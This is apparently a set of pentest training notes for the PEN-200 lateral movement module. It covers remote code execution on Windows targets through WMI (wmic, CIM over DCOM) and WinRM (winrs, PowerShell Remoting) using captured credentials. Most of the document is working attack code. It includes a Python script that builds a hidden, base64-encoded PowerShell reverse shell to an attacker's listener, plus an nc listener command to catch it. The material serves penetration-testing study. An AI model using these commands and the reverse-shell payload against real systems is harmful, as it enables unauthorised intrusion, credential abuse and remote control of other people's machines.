# 24.1.1 — WMI and WinRM

- Module: PEN-200 · 24. Lateral Movement in Active Directory
- Source: portal.offsec.com · module `lateral-movement-in-active-directory-47888` (§24.1.1)
- Code blocks: 6

> Remote code execution as a user who is **local admin on the target** (domain users bypass the UAC
> remote restriction). `{{USERNAME}}` = the creds we move with; `{{TARGET_IP}}`/`{{COMPUTER_NAME}}`
> = the target host. Output omitted.

## WMI via wmic (deprecated LOLBIN) — RPC/135

```cmd
wmic /node:{{TARGET_IP}} /user:{{USERNAME}} /password:{{PASSWORD}} process call create "calc"
```

## WMI via PowerShell (CIM over DCOM)

```powershell
$username = '{{USERNAME}}';
$password = '{{PASSWORD}}';
$secureString = ConvertTo-SecureString $password -AsPlaintext -Force;
$credential = New-Object System.Management.Automation.PSCredential $username, $secureString;

$options = New-CimSessionOption -Protocol DCOM
$session = New-Cimsession -ComputerName {{TARGET_IP}} -Credential $credential -SessionOption $options
$command = 'calc';
Invoke-CimMethod -CimSession $session -ClassName Win32_Process -MethodName Create -Arguments @{CommandLine =$command};
```

> Processes spawn in **session 0** (WMI Provider Host is a system service).

## Base64-encode a PowerShell reverse shell (run on Kali) — reused by all techniques

```python
import sys
import base64

payload = '$client = New-Object System.Net.Sockets.TCPClient("{{LHOST}}",{{LPORT}});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()'

cmd = "powershell -nop -w hidden -e " + base64.b64encode(payload.encode('utf16')[2:]).decode()

print(cmd)
```

> Set `$command`/`$Command` to the resulting `powershell -nop -w hidden -e <b64>` string, start
> `nc -lnvp {{LPORT}}` on Kali, then run the WMI/WinRS/DCOM payload.

## WinRM — winrs (needs Administrators or Remote Management Users on target) — 5985/5986

```cmd
winrs -r:{{COMPUTER_NAME}} -u:{{USERNAME}} -p:{{PASSWORD}} "cmd /c hostname & whoami"
```

## WinRM — PowerShell Remoting

```powershell
$secureString = ConvertTo-SecureString '{{PASSWORD}}' -AsPlaintext -Force;
$credential = New-Object System.Management.Automation.PSCredential '{{USERNAME}}', $secureString;
New-PSSession -ComputerName {{TARGET_IP}} -Credential $credential
Enter-PSSession 1        # by session Id
```
